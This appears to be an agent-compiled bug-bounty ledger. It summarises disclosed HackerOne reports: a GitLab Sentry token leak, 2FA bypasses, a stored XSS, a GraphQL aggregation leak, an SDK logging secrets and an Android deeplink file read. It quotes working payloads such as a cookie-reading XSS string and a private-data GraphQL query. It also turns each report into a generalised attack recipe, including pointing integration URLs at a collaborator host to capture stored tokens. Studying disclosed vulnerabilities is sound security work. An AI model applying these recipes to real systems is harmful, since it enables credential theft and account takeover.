SOURCE: https://hackerone.com/reports/2104591  2026-11-13 (submitted 2023-08-09, disclosed 2024-10-08; GitLab; reporter `70rpedo`; title "Maintainer can leak sentry token by changing the configured URL (fix bypass)"; weakness Information Disclosure; Team severity medium 5.5 `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N`; state Closed/resolved; `visibility: no-content`, VI 0 B — the researcher body is NOT public on any route. This is CVE-2023-4378, the reported fix-bypass of CVE-2022-4365 (H1 #1792626, reporter `joaxcar`, GitLab issue #385193). ROUTES tried in order: live `.json` = metadata + summary only (VI 0 B); `web_extract` on the report page = extractor backend timeout; browser = H1 error page ("Sorry, something went wrong"); `https://r.jina.ai/<url>` = THE ROUTE THAT WORKED for the public "Summary by GitLab" + full timeline (2023-08-09 comments -> Triaged -> Resolved 2023-09-22 -> disclosed 2024-10-08; comment bodies stripped to "posted a comment"); the body itself lives in the CREDITED PUBLIC RECORD instead, fetched this pass: GitLab's public security issue #422134 (gitlab.com/gitlab-org/gitlab/-/issues/422134 — r.jina.ai render = THE ROUTE THAT WORKED, two mid-page elisions flagged below; the issue's opening text + code line also retrieved verbatim via the search backend's page description), gitlab-org/cves raw CVE-2023-4378.json + CVE-2022-4365.json (fetched in full), GitLab's 16.3.1 security-release page (fetched in full), GitLab's own secure-coding guideline page (fetched in full), and NVD/Debian/Rapid7 records. Wiz's CVE-2023-4378 page corroborates the bypass shape but self-declares "This report was generated using AI" and only its search snippet was retrievable — flagged wherever used.)
STATUS: UNVERIFIED (not reproduced — no self-hosted GitLab instance was touched this pass; every quote below appears in the fetched sources named above)
CLASS: sensitive information disclosure with PoC — a stored third-party credential is EXFILTRATED by re-pointing the integration's configured URL: the app sends its saved Sentry token to whatever host the URL field names, and the fix's "did the URL change?" check is a STRING-PREFIX comparison (`start_with?`) bypassed by a prefix-form lookalike host (GitLab's own CVE mapping: CWE-201 "Sensitive data is included in request to attacker-controlled host"; privilege-lateral: project Maintainer PR:H -> org-level Sentry token, S:C). The assignment label INTERNAL-FILE-READ is NOT what this report documents — recorded as the class the sources show.
CORE METHOD:
  1. THE SURFACE: a GitLab project's Settings -> Error Tracking (Sentry) page stores an API URL (`api_host`) AND a Sentry auth token; a project Maintainer can edit it. Issue #422134 repro, verbatim: a fake Sentry is registered first — "`https://yourburpcolaburl.computer` (this is a fake server that will let you add it with any token)" / "Add a random token and click on save." / "invite UserB as maintainer of the project."
  2. THE GADGET (the connect button is the exfil trigger, no save needed): "Now login as UserB in gitlab.com" / "Click on the project and change the sentry server url to `https://yourburpcolaburl.com`" / "Now click connect (do not click save)" / "Check your server and you should see a request containing the token." Root cause, verbatim from the issue body: "The old token is sent with a connect request even if the URL has changed"; the reporter's expected behavior: "Changing the URL should require adding a new token even for connect requests."
  3. THE ORIGINAL BUG (CVE-2022-4365; CVE record verbatim): "A malicious Maintainer can leak the sentry token by changing the configured URL in the Sentry error tracking settings page." THE FIX patched a "url changed?" check, quoted verbatim in issue #422134: "The patch is simply checking if the url is changed by the following in app/services/error_tracking/list_projects_service.rb:" / `url_changed = !setting.api_url&.start_with?(params[:api_host])`.
  4. THE FIX BYPASS (this report, issue #422134 verbatim): "I was just reading a disclosed issue and found a bypass to leak sentry token." / "Note: This is a bypass of the patch made to this ISSUE" (#385193) / "There is a security flaw in the above." The flaw is mechanical in the quoted line: the check compares the OLD `api_url` against the NEW `api_host` with `String#start_with?`, so a NEW host that is a STRING PREFIX of the old URL reads as "unchanged" — the repro's own pair demonstrates it (old `https://yourburpcolaburl.computer` -> new `https://yourburpcolaburl.com`: the new string is a prefix of the old, `url_changed` = false, the change slips through). The published CVE-2023-4378 analysis (Wiz — AI-generated, flagged) describes the same shape: "the security check only verifies if the new URL starts with the original API host ... if the legitimate server is hosted on 'example.com', an attacker could use 'example.co' to bypass the check."
  5. THE TERMINAL (issue verbatim): "Other users can leak the configured Sentry token, getting access to the sentry server. The token gives read and write access to the Sentry instance." The correct fix shape (reporter verbatim): "Changing the URL should require adding a new token even for connect requests"; GitLab's own guideline states the general rule (verbatim): "Don't rely on methods like `.start_with?` when validating a URL ... Use the `URI` class to parse the string, and validate each component (scheme, host, port, path, and so on). Attackers can create valid URLs which look safe, but lead to malicious locations."
DETECTION SIGNAL: an integration settings page (error tracking, webhook-with-signing-secret, monitoring/CI connect, chat-ops) holding BOTH a URL field and a stored secret, where the app issues a "connect/test/verify" request to the user-supplied URL; a URL-change or URL-allowlist check implemented as raw-string comparison (`start_with?`/`startsWith`/`endsWith`/substring/regex over the URL text) instead of parsed scheme+host+port equality; the tell: a request FROM THE APP'S IP carrying `Authorization`/`X-Api-Key`/`?token=` arrives at a host you control.
CHAIN: a project Maintainer (the lowest role that can edit integration settings) points the Sentry API URL at a prefix-form lookalike host they registered (primitive: the URL field is user-controlled and the connect button fires the request) -> the `start_with?(old, new)` check reads the change as "unchanged" and/or the old token rides the connect request regardless (escalation: the app authenticates to attacker DNS with its stored credential) -> the Sentry token lands on the attacker's server (impact: read+write on the victim's Sentry instance — error events, stack traces, release/commit metadata, any PII in events; team-rated medium 5.5, S:C). Doctrine §8.4 preconditions/gain: Maintainer on a project with error tracking configured, no victim interaction / third-party token with read+write.
TRANSFERABLE TEST: on every integration settings page storing a secret beside a URL: (1) point the URL at your collaborator and press the CONNECT/TEST button (the repro says "do not click save" — the test request alone carries the token); if the app's stored `Authorization`/token arrives, you have the gadget; (2) if a change-check/allowlist blocks the edit, probe the CHECK'S SHAPE: `start_with?(old,new)` checks accept any NEW value that is a STRING PREFIX of the old (truncate the last label — `example.co` vs `example.com`; the repro's `.computer` -> `.com`) — register the truncated lookalike and retry; `endsWith`/regex checks take the superstring/host-suffix and `https://old@attacker` userinfo forms instead (recorded ladder, see DEDUPE); (3) confirm what arrived is the app's own stored credential, not just an event forward. Rule: **a settings URL beside a stored secret is a credential-forwarder — the request authenticates to whatever host the field names, and a fix that compares URL strings instead of parsed hosts is bypassed by a lookalike that is a string prefix of the original.**
DEDUPE/DELTA: DELTA over recorded URL-validation-bypass + fix-bypass material — no §17 slot. Recorded neighbours REVIEWED and NOT conflated: the OAuth `redirect_uri` prefix/suffix/subdomain/port ladder (V-13) and the SSRF/redirect bypass battery (Bugbountyskills pre-16 line 3317: "`@`/`//`/`%2f` tricks, `target.com.evil.tld`, wildcard-prefix matching") — those record the SUPERSTRING/userinfo forms used when the check is `new.start_with?(allowed)`; the shape here is the REVERSE (`old.start_with?(new)` — the attacker's URL is a string PREFIX of the original), new as a bypass form; the prefix-check carriers already recorded are PATH/origin-scoped and carry no credential (§17.186 Node `utf8Write` path-prefix bypass, the BD-J `startsWith(javaHome)` canonical-path entry, the mobile deep-link `startsWith(host)` gate at ledger 21029, the `e.origin.startsWith` postMessage gate at 5398); §17.504 records the FIX-BYPASS discipline generally (re-test the fix's shape) — this entry records the instance on URL-change checks; the webhook-object repoint entries (ledger 15039 "THE REPOINT + ERASE: the PUT sets `payload_url` to the attacker's server" / 15042 "webhook/callback/subscription objects (`payload_url`, `callback_url`) as ready-made exfil channels") forward the VICTIM'S EVENTS with no credential attached — different terminal; the Sentry-DSN family (ledger 4521-4528, §17.135 — DSN harvest + `frames[].filename` SSRF) and #2412983 (Mozilla — Sentry auth token found in a public Docker image) are different mechanisms (SSRF via error-report URL; static secret exposure). NEW atoms kept: (a) the integration-settings URL as a STORED-CREDENTIAL FORWARDER — the app attaches its saved secret to the connect/test request, so the field is an exfiltration channel, not just an SSRF; (b) the `url_changed = !old.start_with?(new)` REVERSE-PREFIX change-check bypass (register the truncated-label lookalike; the repro's `.computer` -> `.com` pair is exactly this); (c) the fix shape "changing the URL must invalidate/require re-entry of the stored credential even for connect requests".
FRESHNESS: submitted 2023-08-09; CVE-2023-4378 published 2023-09-01; H1 disclosure 2024-10-08 — OUTSIDE the preferred 6-12 month window (~2.2-3.3 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no GitLab instance touched). The H1 researcher body is withheld (`visibility: no-content` verified on the live `.json`; r.jina.ai render shows only the team summary + timeline). Every quote above appears in the fetched public record: the GitLab issue #422134 (its opening text + `url_changed` code line + impact via the search backend's page description; steps 6-11 + impact + fix-MR pointer (`gitlab-org/security/gitlab!3493`, not fetchable — cited as the issue states it) via the r.jina.ai render, which elided two mid-page spans — steps 1-5 are therefore only partially captured and the UserA/UserB framing is recorded exactly as the captured text shows, not interpreted beyond the mechanics); the gitlab-org/cves CVE-2023-4378.json + CVE-2022-4365.json (full); the GitLab 16.3.1 security-release page (full — verbatim: "A malicious Maintainer can, under specific circumstances, leak the sentry token ... This was as a result of an incomplete fix for CVE-2022-4365. This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N`, 5.5)"); GitLab's secure-coding guideline (full). The `example.co` example is Wiz's (self-declared AI-generated, snippet-only) — flagged; the prefix-truncation derivation rests on the quoted `start_with?` line + the repro's own host pair, not on Wiz. The report title's "under specific circumstances" left as stated; no PoC request invented.

SOURCE: https://hackerone.com/reports/2569993  2026-11-13 (submitted 2024-06-22, disclosed 2024-07-11; HackerOne; reporter `aloneh1`; title "Reports submitted by a non 2fa setupped user account can be transferred to a 2fa require submission program"; weakness Improper Access Control - Generic; Team severity low 2.7 (metrics AV:N/AC:L/PR:H/UI:N); state Closed/substate informative; `visibility: full`, VI 1,092 B read IN FULL via the live `.json` — FIRST route worked; the POC VIDEO link is redacted (█████████) in the body and was not viewed.)
STATUS: UNVERIFIED (not reproduced — no program pair was created on HackerOne this pass; every quote below is verbatim from the fetched body)
CLASS: broken access control — a container-level INTAKE GATE (2FA required to submit) is evaluated only at the report-CREATION event against the REPORTER's account state, and is never re-evaluated when a report is MOVED/TRANSFERRED into the gated container from a sibling container (per-event gate vs per-object-state invariant; CWE-863-adjacent)
CORE METHOD:
  1. THE GATE (verbatim): "1:- create two programs for testing like `h1R` and  `h1B`" / "2: Now got `h1B` program settings and select submission requirements settings and choose 2fa requirements to submit new reports." (the same `submission_requirements` control recorded at ledger #418767).
  2. THE CONTROL REPRODUCES (verbatim): "3: from a no 2fa setupped hackerone account submit a report to `h1R`" — the non-2FA account can submit to the ungated sibling program; and the body notes "when setting up the 2fa require to submit new reports to the program even the program staff can not  able to submit report to the program" (direct submission to `h1B` is blocked for everyone without 2FA).
  3. THE BYPASS (verbatim): "4: Now as a program manager of the two program above mentioned in 1st step transfer the  report from step 3  to `h1B` it successfully transferred the report even the reporter who doesn't have setupped the 2fa." — the TRANSFER verb re-homes the report into the gated program and never re-checks the REPORTER's 2FA state.
  4. THE IMPACT (verbatim): "No proper validation while transfferring the report to a 2fa require submission program weather the reporter have settuped the 2fa to his/her account."
DETECTION SIGNAL: a container-level intake/eligibility requirement (MFA/2FA to submit or join, verified email, KYC, plan, domain verification) enforced when an object is CREATED in the container, PLUS an alternate verb that places an EXISTING object INTO the container (transfer, move, import, clone, migrate, restore, "assign to program/project/workspace") whose handler checks the OPERATOR's permissions but never the OBJECT OWNER's eligibility against the container's requirements. Tell: the requirement is stored per-container and evaluated only in the create/submit controller.
CHAIN: a non-2FA reporter files the report in an ungated sibling program they can submit to (primitive: the report exists with an author who fails the target container's requirement) -> a manager of both programs transfers it into the 2FA-required program (escalation: the per-create gate is never re-evaluated on the move — the write lands in the gated container despite the author's state) -> the owner-set intake policy is evaded at scale (iterate: any report from any non-2FA account enters). [Honest terminal limit: the demonstrated impact IS the policy/consent bypass itself — the program rated it Low 2.7 / informative and no data, account or monetary impact is claimed; the reusable value is the enforcement-gap shape, which generalizes to any container gate — a workspace requiring 2FA/SSO/domain-verification to JOIN admits resources MOVED or IMPORTED in from outside without re-checking the gate.]
TRANSFERABLE TEST: for every container intake rule (2FA/SSO to join, verified-email to post, KYC to trade, plan to add seats), enumerate the verbs that put an object INTO the container — create, invite, import, transfer/move, clone, restore — and drive each with the object's OWNER failing the requirement (create the object in a sibling container first, then move it in; or hold only the operator role while the object's author fails the gate). If the object lands, the gate is per-event and the move verb is the bypass; then check what ELSE the move verb skips (rate limits, bans, quotas — the #418767 set). Rule: **a gate checked at CREATE is not a container invariant — the MOVE/IMPORT verbs are the re-entry path for objects the gate would have refused.**
DEDUPE/DELTA: DELTA over the recorded #418767 entry (bugbountyhuntingskills.md 2874-2886 — the SAME HackerOne control ("2FA required before submitting" + reporter blacklist) bypassed there via the EMBEDDED submission route; its transferable test "enumerate EVERY route that performs the same state change" is the parent rule) — no §17 slot. Recorded neighbours REVIEWED and NOT conflated: #418767 = same verb (create/submit) on an alternate ROUTE that lacks the guard; here a DIFFERENT verb (move/transfer) against a gate evaluated per-create-event — the enforcement-gap shapes are distinct (alternate-route vs alternate-verb) and the move-verb instance is not in #418767's route list (embedded widget, policy-page form, `/api/v1`, mobile BFF, integration webhook); §17.89 (server-owned lifecycle state fields writable through PATCH) and §17.620 (second login surface) are different shapes. Tokens `2569993|aloneh1|2fa setupped|transfer.{0,60}(2fa|report|program)|2fa.{0,60}transfer|transferred.{0,80}(program|report)` = 0 technique hits across the three write targets immediately before append (only the assignment queue/prompt echoes). SOURCE: https://hackerone.com/reports/2543342  2026-11-13 (submitted 2024-06-10, disclosed 2024-07-11; HackerOne; reporter `011alsanosi`; title "Bypassing Two-Factor Authentication via Account Deactivation and Password Reset"; weakness Improper Access Control - Generic; severity none 0.0 `author_type: User` (unrated); state Closed/substate `duplicate` per the live record; `visibility: full`, VI 983 B read IN FULL via the live `.json` — FIRST route worked; the *poc* link is redacted (███) and was not viewed.)
STATUS: UNVERIFIED (not reproduced — no HackerOne account was deactivated or reset this pass; every quote below is verbatim from the fetched body)
CLASS: authentication bypass / ATO chain — the 2FA ENFORCEMENT does not survive the account-lifecycle transition DEACTIVATE -> PASSWORD RESET: the reset reactivates the account and the next login runs WITHOUT the second factor (CWE-287; the recovery path silently disarms a security state)
CORE METHOD:
  1. THE SETUP (verbatim): "1. Go to settings enable 2fa and click on Deactivation".
  2. THE TRANSITION (verbatim): "2. After Deactivation your account go to reset password and reset your password".
  3. THE RESULT (verbatim): "3. After change your password you can notice access account without 2fa" — the enforcement is CLEARED for the main login (not merely skipped by a side flow).
  4. THE ATTACKER MODEL + GAIN (verbatim, Impact): "Attackers with access to a user's email can deactivate the account and reset the password, gaining full access without passing 2FA."
  5. THE FIX SHAPE (verbatim, Recommendations): "Disable Password Resets for Deactivated Accounts: Ensure that deactivated accounts cannot reset their passwords without reactivating." + "Enforce 2FA During Password Reset: Require 2FA verification as part of the password reset process."
DETECTION SIGNAL: any account state transition (deactivate/reactivate, password reset, email change, IdP unlink/re-link, account merge, org leave/rejoin, close/restore) after which the login flow's 2FA behavior differs from the pre-transition baseline (prompt disappears, factor silently unenrolled, backup codes reset); a password-reset flow reachable for deactivated/suspended/locked accounts; a recovery flow that re-establishes full access with the email factor alone.
CHAIN: attacker controls the victim's email (precondition — the report's own framing: "Attackers with access to a user's email"; compromised/reused mailbox) -> deactivate the account from settings (a user-reachable state transition) -> password reset on the deactivated account (escalation: the reset demands nothing but the email link and reactivates the account) -> login with NO 2FA prompt (impact: full account takeover despite 2FA being enabled, and the victim's own logins lose the factor until re-enrollment). Doctrine §8.4 preconditions/gain: email access + one settings action, no 2FA code needed at any point / complete ATO of a 2FA-protected account.
TRANSFERABLE TEST: (1) enable 2FA on a test account and record the baseline (prompt on login, factor enrolled); (2) walk EVERY lifecycle transition one at a time — deactivate->reset, password reset while locked/suspended, email change, IdP unlink, account merge, org leave/rejoin, close->restore — and after EACH, log in and diff the 2FA behavior against the baseline; a transition where the prompt vanishes is the bug; (3) specifically run the password-reset flow with the account in a NON-ACTIVE state — a reset that reactivates without re-binding/re-demanding 2FA is the #2543342 shape. Rule: **2FA enforcement is stored account state, and every lifecycle transition is a place it can be silently cleared — the login form is not the only surface that must demand the factor; the RECOVERY path must not disarm it either.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.726 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: §17.620 (LinkedIn #1842183 — the account-MERGE/identity-transfer flow as a SECOND LOGIN SURFACE that accepts the password without the factor: a SIDE flow granting access while skipping 2FA; here the MAIN login loses its enforcement after a state transition — the merge flow is one of the transitions this entry's test walks, the failure modes are distinct); §17.725 (2FA rate-limit binomial ATO timeline + lockout password-oracle — trial-budget mechanism, not enforcement-clearing); V-07 (OTP verify fail-open on `code=null` — input handling, not state); ledger 4542-4543 (Shopify — the lockout counter dodged by identifier-representation mutation; the counter is evaded, not the enforcement cleared). Tokens `2543342|011alsanosi|deactivation and password reset|deactivat.{0,80}(2fa|password)|2fa.{0,80}deactivat|password reset.{0,80}(2fa|two.factor)` = 0 technique hits across the three write targets immediately before append (the only external hit is an index row in state/pentesterland.md naming an InfoSec-Writeups article "How I Bypassed 2FA while Resetting Password" — NOT an entry in any write target and not opened this pass, so not cited as a source). NEW atoms kept: (a) lifecycle transitions as 2FA-ENFORCEMENT-CLEARING events (deactivate->reset drops the prompt on the MAIN login, not just on a side flow); (b) the password-reset flow reachable on a DEACTIVATED account as the reactivation path that skips re-binding; (c) the fix pair (no resets for deactivated accounts; 2FA demanded DURING reset).
FRESHNESS: submitted 2024-06-10, disclosed 2024-07-11 — OUTSIDE the preferred 6-12 month window (~2.4 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (sacrificing a real account's 2FA state was not attempted); every quote above is verbatim from the fetched body (live `.json`, `visibility: full`); the *poc* link is a redacted placeholder (███) and was not viewed. The record's substate is `duplicate` (H1 triage had seen the issue before) — the method is recorded because OUR ledger had no entry for it; the report it duplicates is not identified in the public record and is NOT invented.

SOURCE: https://hackerone.com/reports/1987172  2026-11-13
ROUTE: full reporter body (626 B, `visibility: full`, VI read IN FULL) via the live `.json` route -> HTTP 200 (FIRST route worked). Metadata: Automattic, "Stored XSS on wordpress.com", weakness Cross-site Scripting (XSS) - Stored, severity medium, reporter `riadalrashed`, created 2023-05-14, disclosed 2023-05-19, state Closed/Resolved. One POC block is redacted (█████████) in the body — not viewed.
STATUS: UNVERIFIED (not reproduced — no wordpress.com / Crowdsignal account was touched this pass; every step and the payload below are quoted verbatim from the fetched body)
CLASS: stored XSS via a platform-sanctioned cross-service EMBED — a sister service's user-generated content (a Crowdsignal poll's ANSWER text) is rendered as raw HTML by the embed snippet the main platform tells users to paste into their own posts (CWE-79)
CORE METHOD:
  1. THE SOURCE SERVICE (verbatim): "1 . Go to https://app.crowdsignal.com/dashboard and create a poll" / "2 . Put the payload as answer <img src=x onerror=alert(document.cookie)>" — the poll ANSWER (an option label: pure display UGC) stores the HTML verbatim.
  2. THE SANCTIONED EMBED (verbatim): "3.  Go to Share Your Poll and Copy  the Website Popup" / "4.Go to https://wordpress.com/posts add new post" / "5. App Website Popup" (paste the Website Popup embed) / "6. Save it" — the platform's own share/embed pipeline renders the sister service's content into the post.
  3. THE TRIGGER (verbatim): "7.Open the page and the XSS will fired"; impact (verbatim): "The attacker can use this issue to execute malicious script code in the victim user browser also redirect the victim user to malicious sites". [Honest bound: the body does not pin the execution ORIGIN beyond the title's claim "Stored XSS on wordpress.com"; the program rated it medium — recorded as stated, not inflated.]
DETECTION SIGNAL: a platform offering sanctioned embeds/widgets of a sister UGC service (polls, surveys, forms, playlists) with a "share/embed" snippet to paste into the main platform's posts/pages, where the embedded service's content fields (answer/option/label/title text) accept HTML and the embed renders it without the sanitization applied to the platform's NATIVE post content. Tell: a payload stored as a widget answer survives into the rendered embed markup as a live node.
CHAIN: attacker creates a poll whose ANSWER carries the payload (primitive: UGC field stored verbatim) -> copies the sanctioned "Website Popup" embed into their own wordpress.com post (primitive: the platform's own embed pipeline renders sister-service content as raw HTML) -> any visitor of the attacker's PUBLIC post executes the script (escalation: stored XSS delivered through a public page — no invite/collaborator step needed) -> session-cookie theft / redirection of visitors (impact: the report's stated impact; program rated medium).
TRANSFERABLE TEST: on any platform with sanctioned embeds of a sister UGC service: (1) create content on the SOURCE service with `<img src=x onerror=alert(document.cookie)>` in EVERY text field (answer/option, title, description, style name, media embed); (2) embed it on the TARGET platform through every official embed type (inline widget, popup, iframe, script snippet, shortcode); (3) open the embed as a third party and inspect the LIVE DOM for the executing node; (4) record which origin `document.domain` returns (this report's body does not state it). Rule: **the sanctioned embed is a second rendering path — it is built to "make the content look right" and often skips the sanitizer the platform applies to its own content; the answer/option field of an embeddable widget is UGC that rides straight into the host page.**
DEDUPE/DELTA: DELTA over the recorded Crowdsignal-content-XSS family — no §17 slot. Recorded neighbours REVIEWED and NOT conflated: #974271 (bugbountyhuntingskills.md 9362-9375 — the "Embed Media" `[dailymotion id=…]` SHORTCODE attribute breakout, server-side shortcode render in the `app.crowdsignal.com` origin, collaborator invite chain) and #1054526 (methodologies-2026-11-11.md 2363-2375 — Crowdsignal "Style Name" `<noscript>` mXSS parser differential, victim must select the attacker's Style; general method recorded at V-07) — both are CROWDSIGNAL-side admin-UI fields with different sinks (shortcode interpolator / noscript raw-text differential); #1987172's NEW atoms: the poll ANSWER field (plain display UGC), the sanctioned "Website Popup" share-snippet embed into a wordpress.com POST as the delivery+render path, and public-post delivery (any visitor, no invite). Neither recorded neighbour's transferable test covers widget answer fields or the share-snippet embed path. Tokens `1987172|riadalrashed|Website Popup|poll answer` = 0 hits across the three write targets immediately before append.
FRESHNESS: submitted 2023-05-14, disclosed 2023-05-19 — OUTSIDE the preferred 6-12 month window (~2.5 years) — recorded as BACKFILL, flagged; read because assigned.

SOURCE: https://hackerone.com/reports/1838329  2026-11-13
ROUTE: full reporter body (2,537 B, `visibility: full`, VI read IN FULL) via the live `.json` route -> HTTP 200 (FIRST route worked). Metadata: HackerOne (hackerone.com), "Private information exposed through GraphQL search endpoints aggregates", weakness Information Disclosure, severity medium, reporter `reigertje`, created 2023-01-18, disclosed 2023-01-19, state Closed/Resolved.
STATUS: UNVERIFIED (not reproduced — no query was run against any target this pass; the query and output below are quoted verbatim from the fetched body)
CLASS: sensitive information disclosure with PoC / broken access control on READ paths — the per-document visibility filter is applied to the search HITS but NOT to the AGGREGATION buckets (`aggs` argument), so a terms-facet on a sensitive field returns values of records the caller cannot read (CWE-200 / CWE-863)
CORE METHOD:
  1. THE SURFACE (verbatim): "Private information can be exposed using `aggs` argument on the `search` and `opportunities_search` endpoints on the GraphQL root node." — the `aggs` argument + return field accepts an Elasticsearch-style aggregation spec.
  2. THE QUERY, verbatim:
     query {
       me { id }
       opportunities_search(query:{}, aggs:{results:{terms: {field:"handle"}}}) {
         aggs
       }
     }
  3. THE BYPASS, verbatim: "The output will show aggregations by the `handle` which are not filtered on whether they are private or not." — the response `aggs.results.buckets[]` holds `{"key": "<private handle>", "doc_count": 1}` entries for teams/programs the caller has NO access to (triage redacted the sample's bucket keys to `"private"`).
  4. THE GENERAL SHAPE (verbatim): "other things can be exposed in the same way using this or other indexes on the `search` endpoint" — any aggregatable field of any index behind the endpoint is a read channel regardless of the hit filter.
DETECTION SIGNAL: a search API (GraphQL `search`-like root fields, REST `/_search`, admin faceted search) exposing an `aggs`/`facets`/`group_by`/`terms` argument where the caller names the FIELD, while results are filtered/ACL'd at the document level and the aggregation path is not; buckets returned for documents the hit list omits. Tell: `terms` buckets on a field whose values should be private (handles, emails, tenant names) while the plain query for the same field returns nothing.
CHAIN: a caller (the report's sample response shows `"me": null` — whether the aggs path works fully unauthenticated is a test step, not claimed here) sends an `aggs` terms query naming a sensitive field (primitive: the argument accepts the field name) -> the aggregation runs over the UNFILTERED index (primitive: the ACL is applied to hits, not buckets) -> private values return as facet buckets (demonstrated terminal, report verbatim: "at least allows to expose asset information, handles and other information of teams you don't have access to" — private program handles of HackerOne teams; team rated medium). [General escalation, flagged as general-shape only: wherever indexed fields carry PII/credentials (emails, tokens, names), the same facet call is a blind extraction channel at scale — the report itself bounds this: "Impact depends on what information is stored in which index, and which fields can be aggregated by."]
TRANSFERABLE TEST: on every search endpoint with an aggregation/facet/group argument: (1) pick a field whose VALUES are access-controlled (private names, emails, handles, tenant ids) and request `aggs:{results:{terms:{field:"<name>"}}}` (GraphQL) or `{"aggs":{"results":{"terms":{"field":"<name>"}}}}` (ES) with an EMPTY/own-tenant query, both unauthenticated and with a low-privilege session; (2) diff the bucket keys against what the plain hits return for the same query — buckets containing objects you cannot read = the ACL bypass; (3) walk every index/alias the endpoint exposes (`search` vs `opportunities_search` etc.) and every aggregatable field (keyword fields especially); (4) extend with cardinality/range aggs as existence/size oracles. Rule: **the aggregation path is a READ — an ACL applied to search hits is not applied to facet buckets unless the code says so; a terms agg on a sensitive field enumerates values the caller cannot otherwise read.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.727 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: the recorded GraphQL entries (bugbountyhuntingskills.md §10.2 field-level authz on the `User` type; §3.4 mutation enumeration; §17.3 free-form `filter` JSON -> sift `$where` -> RCE; #2139190 `LockReport` mutation IDOR; #489146 H1 GraphQL $20k disclosure/authz) all concern MUTATION- or NODE-level access, not aggregation arguments; the "display-suppression is not authorization" family (#347693 the page's JSON twin) and §17.313 ("the UI's ACL filter is not the object's ACL") are record/field reads bypassing a HIDDEN UI state — the facet mechanism returns values of records the caller cannot read AT ALL, via an aggregate over the unfiltered index; §17.723 (filter selector as an IDOR inference oracle) leaks metadata through result-set EXTREMES of the caller's OWN rows — facets here return the PRIVATE rows' values directly. Tokens `1838329|reigertje|opportunities_search|\baggs\b` = 0 technique hits across the three write targets immediately before append.

CLASS: sensitive information disclosure with PoC — CWE-532 (insertion of sensitive information into log files): a payment SDK logs its own secret API key at DEBUG level on EVERY request, so every log sink becomes a credential store (recorded chain-first per the chain-only rule)
CORE METHOD:
  1. THE CODE (report verbatim): "While code-reviewing the repository https://github.com/omise/omise-python/, I have found that you log in clear-text some sensitive data." — check `omise/request.py#L88` and `#L111`: "The code source explicitly logs in debugging mode the secret API key." `logger.debug('Authorization: …', self.api_key)` appears in BOTH `send()` and `send_file()`, beside `logger.debug('Payload: …', …)` and `logger.debug('Headers: …', …)`. (Lab note: this tooling's terminal renders `Authorization: <value>` strings with the value masked — the reproduced LOG line below is the ground truth: the key is interpolated in full.)
  2. THE REPRO (report verbatim): "Activate logging level debug and run the following sample.py file" — `omise.api_secret = 'skey_test_…'` then one API call (`omise.Customer.create(...)`); "You will get:" [the key in the debug log — the screenshot attachment {F1857247}].
  3. LAB CONFIRMATION (this pass, verbatim from the run): `DEBUG:omise.request:Authorization: skey_test_LABFAKE000000000000` — the secret key appears in the log line itself (the response body is also logged at INFO: `Received HTTP response: …`).
  4. THE IMPACT (report verbatim): "sensitive data logged in clear text may end up in unusual places: recorded demonstrations, copied logs, etc." Remediation (verbatim): "log at least a partial part of the secret API key if not remove the L88 and L111 in whole."
DETECTION SIGNAL: an SDK/client/app passing `api_key`/`Authorization`/tokens to a logger call (grep `logger\.(debug|info|warn|error)\([^)]*(api_key|Authorization|token|secret|password)`); DEBUG logging enabled in a deployed config; any log surface readable by a lower-trust party (error-tracker breadcrumbs capturing request headers, support log exports, demo recordings, shared log aggregators). Tell: a request-authenticated call made from a client machine produces a log line containing the credential itself.
CHAIN: an application runs the SDK with DEBUG logging on (primitive: the library writes the secret key to the log on every request) -> the logs are copied/recorded/shipped (the report's own leak path, verbatim: "recorded demonstrations, copied logs, etc.") to a sink a third party can read (escalation: every log consumer now holds the merchant's `skey_`) -> the Omise secret key grants read/write on the payment API — create charges/refunds against the merchant's customers (impact: monetary). Honest bound (doctrine §8.4): precondition = obtaining the logs (the report demonstrates the DISCLOSURE, not an unauthenticated log-access path); gain = the merchant's payment secret key in cleartext; program rated medium — not inflated.
TRANSFERABLE TEST: (1) SOURCE REVIEW of any client SDK/integration/agent: grep for logger calls whose arguments are auth material (`logger\..*\(.*(api_key|Authorization|token|secret|password)`); (2) BLACK-BOX: trigger flows that carry credentials (login, API/agent connect, OAuth connect, webhook test), then read back every reachable log/telemetry surface — debug/console endpoints, error-tracker event previews including captured request headers (Sentry-style breadcrumbs), support/export features — and look for the credential in cleartext; (3) LAB shape: enable DEBUG on the client and diff the log output before/after one call. Rule: **a client that logs its own Authorization material turns every log consumer into a credential holder — the secret must be redacted at the logging call, and debug logs are a secret store in every later step of the chain.**

SOURCE: https://hackerone.com/reports/1122177  2026-11-13
ROUTE: full reporter body (1,869 B, `visibility: full`, VI read IN FULL) via the live `.json` route -> HTTP 200 (FIRST route worked). Metadata: Reddit (android app 2021.8.0, Android 11), "Third party app could steal access token as well as protected files using inAppBrowser", weakness Information Disclosure, severity medium, reporter `rahulkankrale`, created 2021-03-10, disclosed 2021-10-27, Closed/Resolved. Video attachment {F1225199} is a placeholder — not viewed.
STATUS: UNVERIFIED (not reproduced — no Android device or Reddit app was touched this pass; every step, command and payload below are quoted verbatim from the fetched body)
CLASS: mobile internal file read (app-private file disclosure) via an UNVALIDATED DEEPLINK ROUTER — the activity that routes app links performs NO scheme/host check on the incoming URI, so any third-party app hands it a `file://` URI and the app-privileged in-app browser opens the app's OWN private storage files (session-token XML, preferences, DB, cookies) (CWE-939 / CWE-200)
CORE METHOD:
  1. THE ROUTER (verbatim): "This app uses com.reddit.frontpage.RedditDeepLinkActivity class to route app links including deeplink and reddit.com links while this class does not check for scheme, host and it opens given url in InAppBrowser and IAB have access to apps private/protected files."
  2. THE READ (verbatim): "any third party app could steal session token from \"data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml\" files as well as rest of sensitive files like DB, Cookies etc."
